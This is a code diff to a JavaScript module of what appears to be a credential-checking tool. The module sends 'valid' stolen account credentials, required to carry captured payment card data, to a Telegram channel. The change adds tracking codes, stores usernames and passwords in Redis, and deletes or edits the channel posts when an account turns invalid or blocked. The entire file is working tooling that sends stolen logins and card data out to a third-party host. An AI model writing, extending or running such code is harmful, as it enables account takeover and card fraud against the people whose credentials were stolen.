@@ -4,18 +4,20 @@
  * =============================================================================
  * 
  * Sends VALID credentials (with capture data) to a configured Telegram channel.
- * Ensures each credential is only forwarded once via channelForwardStore.
- * 
- * Forwarding conditions:
- * - Must have latest order (not 'n/a')
- * - Must have card data (profile.cards array with at least one card)
- * 
- * Requires FORWARD_CHANNEL_ID environment variable to be set.
+ * Includes tracking code for message management (delete on INVALID, update on BLOCKED).
  * 
  * =============================================================================
  */
 
 const { hasBeenForwarded, markForwarded } = require('./channelForwardStore');
+const {
+  generateTrackingCode,
+  storeMessageRef,
+  getMessageRefByCredentials,
+  deleteMessageRef,
+  clearForwardedStatus,
+} = require('./messageTracker');
+const { escapeV2, codeV2, boldV2 } = require('./messages/helpers');
 const { createLogger } = require('../logger');
 
 const log = createLogger('channel-forwarder');
@@ -59,7 +61,7 @@ function validateCaptureForForwarding(capture) {
   
   // Check for card data (profile must exist with cards array)
   if (!capture.profile) {
-    return { valid: false, reason: 'no profile data (skip logic may have failed)' };
+    return { valid: false, reason: 'no profile data' };
   }
   
   if (!capture.profile.cards || capture.profile.cards.length === 0) {
@@ -67,6 +69,30 @@ function validateCaptureForForwarding(capture) {
   }
   
   return { valid: true, reason: '' };
+}
+
+/**
+ * Append tracking code to message.
+ */
+function appendTrackingCode(message, trackingCode) {
+  return `${message}\n\n📎 ${codeV2(trackingCode)}`;
+}
+
+/**
+ * Build BLOCKED status update message.
+ */
+function buildBlockedMessage(trackingCode, username) {
+  const parts = [
+    `🔒 ${boldV2('ACCOUNT BLOCKED')}`,
+    '',
+    escapeV2('This account has been blocked or requires verification.'),
+    '',
+    `${boldV2('🔐 Credentials')}`,
+    `└ User: ${codeV2(username)}`,
+    '',
+    `📎 ${codeV2(trackingCode)}`,
+  ];
+  return parts.join('\n');
 }
 
 /**
@@ -110,16 +136,30 @@ async function forwardValidToChannel(telegram, username, password, message, capt
       return false;
     }
     
-    // Send the exact same message to channel
-    await telegram.sendMessage(channelId, message, {
+    // Generate tracking code
+    const trackingCode = generateTrackingCode(username, password);
+    
+    // Append tracking code to message
+    const messageWithCode = appendTrackingCode(message, trackingCode);
+    
+    // Send to channel
+    const sentMessage = await telegram.sendMessage(channelId, messageWithCode, {
       parse_mode: 'MarkdownV2',
       disable_web_page_preview: true,
+    });
+    
+    // Store message reference for future updates/deletion
+    await storeMessageRef(trackingCode, {
+      messageId: sentMessage.message_id,
+      chatId: channelId,
+      username,
+      password,
     });
     
     // Mark as forwarded
     await markForwarded(username, password);
     
-    log.info(`Forwarded to channel: ${username.slice(0, 5)}***`);
+    log.info(`Forwarded to channel: ${username.slice(0, 5)}*** [${trackingCode}]`);
     return true;
     
   } catch (err) {
@@ -137,8 +177,76 @@ async function forwardValidToChannel(telegram, username, password, message, capt
   }
 }
 
+/**
+ * Handle credential status change - delete on INVALID, update on BLOCKED.
+ * 
+ * @param {Object} telegram - Telegraf telegram instance
+ * @param {string} username - Email/username
+ * @param {string} password - Password
+ * @param {string} newStatus - New credential status (INVALID, BLOCKED)
+ * @returns {Promise<boolean>} True if action was taken
+ */
+async function handleCredentialStatusChange(telegram, username, password, newStatus) {
+  const channelId = getChannelId();
+  if (!channelId) return false;
+  
+  try {
+    const messageRef = await getMessageRefByCredentials(username, password);
+    
+    if (!messageRef) {
+      log.debug(`No forwarded message found for: ${username.slice(0, 5)}***`);
+      return false;
+    }
+    
+    const { messageId, trackingCode } = messageRef;
+    
+    if (newStatus === 'INVALID') {
+      // Delete the message from channel
+      await telegram.deleteMessage(channelId, messageId);
+      
+      // Clean up Redis entries
+      await deleteMessageRef(username, password);
+      await clearForwardedStatus(username, password);
+      
+      log.info(`Deleted channel message: ${username.slice(0, 5)}*** [${trackingCode}]`);
+      return true;
+      
+    } else if (newStatus === 'BLOCKED') {
+      // Update message to show BLOCKED status
+      const blockedMessage = buildBlockedMessage(trackingCode, username);
+      
+      await telegram.editMessageText(
+        channelId,
+        messageId,
+        null,
+        blockedMessage,
+        { parse_mode: 'MarkdownV2' }
+      );
+      
+      log.info(`Updated channel message to BLOCKED: ${username.slice(0, 5)}*** [${trackingCode}]`);
+      return true;
+    }
+    
+    return false;
+    
+  } catch (err) {
+    if (err.message.includes('message to delete not found') ||
+        err.message.includes('message is not modified') ||
+        err.message.includes('MESSAGE_ID_INVALID')) {
+      log.debug(`Message already deleted/modified: ${username.slice(0, 5)}***`);
+      // Clean up stale references
+      await deleteMessageRef(username, password);
+      return false;
+    }
+    
+    log.warn(`Failed to handle status change: ${err.message}`);
+    return false;
+  }
+}
+
 module.exports = {
   forwardValidToChannel,
+  handleCredentialStatusChange,
   isForwardingEnabled,
   getChannelId,
   validateCaptureForForwarding,
